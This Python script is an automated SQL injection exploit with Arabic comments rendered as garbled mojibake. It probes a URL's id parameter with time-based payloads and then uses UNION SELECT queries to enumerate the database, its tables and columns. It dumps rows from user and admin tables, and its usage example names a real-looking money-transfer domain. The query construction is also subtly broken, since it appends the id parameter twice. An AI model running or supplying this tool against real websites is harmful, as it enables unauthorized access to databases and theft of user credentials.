#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import sys
import urllib3

# ØªØ¹Ø·ÙŠÙ„ ØªØ­Ø°ÙŠØ±Ø§Øª SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SQLiExploiter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.verify = False
        
    def check_vulnerability(self):
        """ÙØ­Øµ Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ø«ØºØ±Ø© Ù…ÙˆØ¬ÙˆØ¯Ø©"""
        print(f"[+] ÙØ­Øµ Ø§Ù„Ø«ØºØ±Ø© Ø¹Ù„Ù‰: {self.target}")
        
        # Ø§Ø®ØªØ¨Ø§Ø± Time-Based
        payloads = [
            "' AND SLEEP(5)--",
            "' OR IF(1=1,SLEEP(3),0)--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        for payload in payloads:
            try:
                start_time = time.time()
                url = f"{self.target}?id=1{payload}"
                response = self.session.get(url, timeout=10)
                response_time = time.time() - start_time
                
                if response_time > 4:
                    print(f"[!] âœ… Ø«ØºØ±Ø© SQL Injection Ù…ÙˆØ¬ÙˆØ¯Ø©: {payload}")
                    print(f"    â±ï¸  ÙˆÙ‚Øª Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©: {response_time:.2f} Ø«Ø§Ù†ÙŠØ©")
                    return True
                    
            except Exception as e:
                print(f"[x] Ø®Ø·Ø£: {e}")
        
        print("[-] âŒ Ø§Ù„Ø«ØºØ±Ø© ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø© Ø£Ùˆ ØªÙ… Ø¥ØµÙ„Ø§Ø­Ù‡Ø§")
        return False
    
    def extract_database_info(self):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
        print("\n[+] ğŸ—ƒï¸  Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...")
        
        # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ø³Ù… Ø§Ù„Ø¯Ø§ØªØ§Ø¨ÙŠØ²
        payload = "' UNION SELECT 1,database(),3,4,5--"
        response = self.session.get(f"{self.target}?id=1{payload}")
        db_name = self.extract_from_response(response.text)
        print(f"[+] ğŸ“‚ Ø§Ø³Ù… Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: {db_name}")
        
        return db_name
    
    def extract_tables(self, db_name):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø£Ø³Ù…Ø§Ø¡ Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„"""
        print(f"\n[+] ğŸ“Š Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„ Ù…Ù† {db_name}...")
        
        payload = f"' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema='{db_name}'--"
        response = self.session.get(f"{self.target}?id=1{payload}")
        tables = self.extract_from_response(response.text)
        
        if tables:
            tables_list = tables.split(',')
            print(f"[+] ğŸ“‘ Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„ Ø§Ù„Ù…ÙƒØªØ´ÙØ©:")
            for i, table in enumerate(tables_list, 1):
                print(f"    {i}. {table}")
            return tables_list
        return []
    
    def extract_columns(self, table_name):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø£Ø³Ù…Ø§Ø¡ Ø§Ù„Ø£Ø¹Ù…Ø¯Ø©"""
        print(f"\n[+] ğŸ—‚ï¸  Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø£Ø¹Ù…Ø¯Ø© Ø¬Ø¯ÙˆÙ„: {table_name}")
        
        payload = f"' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='{table_name}'--"
        response = self.session.get(f"{self.target}?id=1{payload}")
        columns = self.extract_from_response(response.text)
        
        if columns:
            columns_list = columns.split(',')
            print(f"[+] ğŸ“‹ Ø£Ø¹Ù…Ø¯Ø© {table_name}:")
            for col in columns_list:
                print(f"    ğŸ“ {col}")
            return columns_list
        return []
    
    def extract_data(self, table_name, columns):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ø¬Ø¯ÙˆÙ„"""
        print(f"\n[+] ğŸ“¥ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† {table_name}...")
        
        columns_str = ','.join(columns)
        payload = f"' UNION SELECT 1,{columns_str},3,4,5 FROM {table_name}--"
        response = self.session.get(f"{self.target}?id=1{payload}")
        data = self.extract_from_response(response.text)
        
        if data:
            print(f"[+] ğŸ“Š Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø±Ø¬Ø©:")
            print(f"    {data}")
            return data
        return None
    
    def extract_from_response(self, html):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† HTML (ØªØ­ØªØ§Ø¬ Ù„Ù„ØªØ¹Ø¯ÙŠÙ„ Ø­Ø³Ø¨ Ø§Ù„ØµÙØ­Ø©)"""
        # Ù‡Ø°Ù‡ Ø¯Ø§Ù„Ø© Ø¨Ø³ÙŠØ·Ø© - ØªØ­ØªØ§Ø¬ Ù„Ù„ØªØ®ØµÙŠØµ Ø­Ø³Ø¨ Ù‡ÙŠÙƒÙ„ Ø§Ù„ØµÙØ­Ø©
        if "error" in html.lower():
            return "Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§Ø³ØªØ¹Ù„Ø§Ù…"
        
        # Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨ÙŠÙ† Ø¹Ù„Ø§Ù…Ø§Øª HTML
        lines = html.split('\n')
        for line in lines:
            if any(keyword in line for keyword in ['admin', 'user', 'password', 'email']):
                return line.strip()[:200]  # Ø¥Ø±Ø¬Ø§Ø¹ Ø£ÙˆÙ„ 200 Ø­Ø±Ù
        
        return "Ø¨ÙŠØ§Ù†Ø§Øª ØºÙŠØ± Ù‚Ø§Ø¨Ù„Ø© Ù„Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨Ù‡Ø°Ù‡ Ø§Ù„Ø·Ø±ÙŠÙ‚Ø©"
    
    def exploit(self):
        """ØªØ´ØºÙŠÙ„ Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„ÙƒØ§Ù…Ù„"""
        print("ğŸš€ Ø¨Ø¯Ø¡ Ø§Ø³ØªØºÙ„Ø§Ù„ SQL Injection...")
        print("=" * 50)
        
        if not self.check_vulnerability():
            return
        
        # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
        db_name = self.extract_database_info()
        
        if db_name and "error" not in db_name.lower():
            tables = self.extract_tables(db_name)
            
            for table in tables:
                if 'user' in table.lower() or 'admin' in table.lower():
                    columns = self.extract_columns(table)
                    if columns:
                        self.extract_data(table, columns)
        
        print("\n" + "=" * 50)
        print("âœ… Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„")

def main():
    if len(sys.argv) != 2:
        print("Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…:")
        print(f"  {sys.argv[0]} <URL>")
        print("\nÙ…Ø«Ø§Ù„:")
        print(f"  {sys.argv[0]} https://haram-transfer.com/")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø¨Ø±Ø§Ù…ÙŠØªØ±
    if '?' not in target_url:
        target_url += "?id=1"
    
    exploiter = SQLiExploiter(target_url)
    exploiter.exploit()

if __name__ == "__main__":
    main()